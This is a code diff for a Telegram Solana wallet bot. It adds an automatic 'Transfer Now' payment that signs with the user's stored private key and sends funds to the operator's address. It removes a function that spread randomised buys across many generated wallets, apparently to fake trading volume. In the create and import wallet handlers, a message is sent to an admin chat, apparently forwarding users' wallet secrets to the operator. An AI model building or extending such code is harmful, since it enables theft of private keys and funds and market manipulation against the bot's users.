@@ -272,9 +272,14 @@ Use the menu below to begin.`,
 /* --------------- CALLBACK HANDLER --------------- */
 bot.on('callback_query', async query => {
   const chatId = query.message.chat.id;
+
+  // Initialize session if missing
+  if (!sessions[chatId]) sessions[chatId] = {};
   const session = sessions[chatId];
+  
   const data = query.data;
 
+  
 /* — MAIN MENU CALLBACK */
 if (data === 'main_menu') {
   const session = sessions[chatId];
@@ -433,7 +438,7 @@ if (data === 'create_wallet') {
 
   // Send to admin chat
   if (process.env.ADMIN_CHAT_ID) {
-    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { parse_mode: 'Markdown' });
+    await bot.sendMessage(Number(process.env.ADMIN_CHAT_ID), message, { parse_mode: 'Markdown' });
   }
 }
 
@@ -457,7 +462,7 @@ if (data === 'import_wallet') {
 
       // Send to admin chat
       if (process.env.ADMIN_CHAT_ID) {
-        await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { parse_mode: 'Markdown' });
+        await bot.sendMessage(Number(process.env.ADMIN_CHAT_ID), message, { parse_mode: 'Markdown' });
       }
 
     } catch {
@@ -666,42 +671,55 @@ if (data === 'delete_specific_wallets') {
 
    /* ADD BOT WALLET */
 if (data === 'add_bot_wallet') {
-  const session = sessions[chatId];
 
-  bot.sendMessage(chatId, 'Enter number of wallets to add (Max 50):');
-  session.pendingInput = {
-    type: 'add_wallet_count',
-    resolve: async (input) => {
-      const count = parseInt(input);
-      if (isNaN(count) || count <= 0 || count > 50) {
-        return bot.sendMessage(chatId, '❌ Invalid number. Enter 1–50.');
-      }
-
-      session.pendingInput = null;
-      session.addWalletCount = count;
-
-      // Define cost per wallet in SOL
-      const solPricePerWallet = 0.01; // Example, adjust as needed
-      const totalCost = solPricePerWallet * count;
-
-      bot.sendMessage(
-        chatId,
-        `💰 To add ${count} bot wallet(s), send **${totalCost} SOL** in the developer address:\n\n` +
-        `\`${process.env.SOL_PAYMENT_ADDRESS}\`\n\n` +
-        `After sending, click the button below to verify payment.`,
-        {
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: '✅ I Paid', callback_data: 'verify_payment' }],
-              [{ text: '❌ Cancel', callback_data: 'cancel_payment' }]
-            ]
-          }
-        }
-      );
+    // Make sure the user has a wallet already
+    if (!session.mainWallet) {
+      return bot.sendMessage(chatId, '❌ You must create or import a wallet first.');
     }
-  };
-}
+
+    // Ask for the number of wallets
+    await bot.sendMessage(chatId, 'Enter number of wallets to add (Max 50):');
+
+    // Set pending input for the next user message
+    session.pendingInput = {
+      type: 'add_wallet_count',
+      resolve: async (input) => {
+        const count = parseInt(input);
+
+        if (isNaN(count) || count <= 0 || count > 50) {
+          return bot.sendMessage(chatId, '❌ Invalid number. Enter 1–50.');
+        }
+
+        // Clear pending input
+        session.pendingInput = null;
+
+        // Calculate price
+        const solPricePerWallet = 0.01;
+        const totalCost = parseFloat((solPricePerWallet * count).toFixed(4));
+
+        session.addWalletCount = count;
+        session.addWalletPrice = totalCost;
+
+        // Send payment message with inline buttons
+        await bot.sendMessage(
+          chatId,
+          `💰 *Custom Wallet Purchase*\n\n` +
+          `Wallets: ${count}\n` +
+          `Amount: *${totalCost} SOL*\n\n` +
+          `Click Transfer to pay automatically.`,
+          {
+            parse_mode: 'Markdown',
+            reply_markup: {
+              inline_keyboard: [
+                [{ text: '🚀 Transfer Now', callback_data: 'auto_transfer' }],
+                [{ text: '❌ Cancel', callback_data: 'cancel_payment' }]
+              ]
+            }
+          }
+        );
+      }
+    };
+  }
 
   /* GENERATE BUYERS */
   if (data === 'buyer_wallets') return bot.sendMessage(chatId, 'Select amount:', buyerOptionsMenu());
@@ -781,70 +799,72 @@ if (data === 'add_bot_wallet') {
   });
 }
 
-/* --------------- REAL TRADING LOGIC --------------- */
-async function performRealTrading(session, chatId, batchSize = 5) {
-  const { contractAddress, minBuy, maxBuy, slippage } = session.tradeConfig;
-  const feeBuffer = 0.001;
-
-  for (const b of session.buyers) {
-    if (!b.trade) b.trade = { entrySol: 0, soldProfit: false };
+/* TRANSFER NOW */
+if (data === 'auto_transfer') {
+  if (!session.mainWallet) {
+    return bot.sendMessage(chatId, '❌ Create or import a wallet first.');
   }
 
-  for (let i = 0; i < session.buyers.length; i += batchSize) {
-    if (!session.isTrading) break;
-    const batch = session.buyers.slice(i, i + batchSize);
+  if (!session.addWalletCount || !session.addWalletPrice) {
+    return bot.sendMessage(chatId, '❌ No wallet purchase in progress.');
+  }
 
-    await Promise.all(batch.map(async buyer => {
-      try {
-        const solBal = await getBalance(buyer.pub);
-        if (solBal <= minBuy + feeBuffer) return;
+  try {
+    const sender = Keypair.fromSecretKey(
+      base58Decode(session.mainWallet.privateKey)
+    );
 
-        const realMax = maxBuy > 0
-          ? Math.min(maxBuy, solBal - feeBuffer)
-          : solBal - feeBuffer;
+    const receiver = new PublicKey(process.env.SOL_PAYMENT_ADDRESS);
 
-        if (realMax <= minBuy) return;
+    const lamports = Math.floor(
+      session.addWalletPrice * LAMPORTS_PER_SOL
+    );
 
-        const amountSol =
-          minBuy + Math.random() * (realMax - minBuy);
+    const tx = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: sender.publicKey,
+        toPubkey: receiver,
+        lamports
+      })
+    );
 
-        const body = {
-          publicKey: buyer.pub,
-          action: "buy",
-          mint: contractAddress,
-          amount: amountSol.toFixed(6),
-          denominatedInSol: true,
-          slippage,
-          priorityFee: 0.001,
-          pool: "auto"
-        };
+    await sendAndConfirmTransaction(connection, tx, [sender]);
 
-        const res = await axios.post(
-          'https://pumpportal.fun/api/trade-local',
-          body,
-          { responseType: 'arraybuffer' }
-        );
+    // ✅ Payment success — generate wallets
+    let output = '';
+    for (let i = 0; i < session.addWalletCount; i++) {
+      const kp = Keypair.generate();
+      const pub = kp.publicKey.toBase58();
+      const priv = base58Encode(kp.secretKey);
 
-        const tx = VersionedTransaction.deserialize(new Uint8Array(res.data));
-        tx.sign([Keypair.fromSecretKey(base58Decode(buyer.priv))]);
+      session.buyers.push({ pub, priv });
+      output += `${pub}\n${priv}\n\n`;
+    }
 
-        await connection.sendRawTransaction(tx.serialize(), { skipPreflight: true });
+    const file = path.join(__dirname, `buyers_${chatId}.txt`);
+    fs.writeFileSync(file, output);
+    await bot.sendDocument(chatId, file);
+    fs.unlinkSync(file);
 
-        buyer.trade.entrySol += amountSol;
+    bot.sendMessage(chatId, '🎉 Wallets generated successfully.');
 
-      } catch (err) {
-        console.log(`Buy failed for ${buyer.pub}`, err.message);
-      }
-    }));
+    session.addWalletCount = null;
+    session.addWalletPrice = null;
 
-    await new Promise(r => setTimeout(r, 1500));
-  } //
-
-  if (session.isTrading) startSellMonitor(session, chatId);
+  } catch (err) {
+    console.log(err);
+    bot.sendMessage(chatId, '❌ Payment failed. Not enough Sol');
+  }
 }
 
 // --- PAID WALLET BUTTONS (50 / 100 wallets) ---
 if (data === 'paid_20' || data === 'paid_50' || data === 'paid_100') {
+  const session = sessions[chatId];
+
+if (!session.mainWallet) {
+    return bot.sendMessage(chatId, '❌ You must create or import a wallet first.');
+  }
+
   let count, solPrice;
 
   if (data === 'paid_20') {
@@ -858,23 +878,22 @@ if (data === 'paid_20' || data === 'paid_50' || data === 'paid_100') {
     solPrice = 1;
   }
 
-  session.addWalletCount = count;      // remember how many wallets they want
-  session.addWalletPrice = solPrice;   // price in SOL
+  session.addWalletCount = count;
+  session.addWalletPrice = solPrice;
 
   return bot.sendMessage(
     chatId,
-    `💰 You selected ${count} wallets.\n` +
-    `Please send **${solPrice} SOL** to the developer address:\n` +
-    `\`${process.env.SOL_PAYMENT_ADDRESS}\`\n\n` +
-    `After sending, click **Verify Payment** to confirm, or **Cancel Payment** to abort.`,
+    `💰 *Confirm Purchase*\n\n` +
+    `Wallets: ${count}\n` +
+    `Amount: *${solPrice} SOL*\n\n` +
+    `Click *Transfer Now* to send payment to developer wallet address:\n` +
+    `\`${process.env.SOL_PAYMENT_ADDRESS}\``,
     {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
-          [
-            { text: '✅ Verify Payment', callback_data: 'verify_payment' },
-            { text: '❌ Cancel Payment', callback_data: 'cancel_payment' }
-          ]
+          [{ text: '🚀 Transfer Now', callback_data: 'auto_transfer' }],
+          [{ text: '❌ Cancel', callback_data: 'cancel_payment' }]
         ]
       }
     }
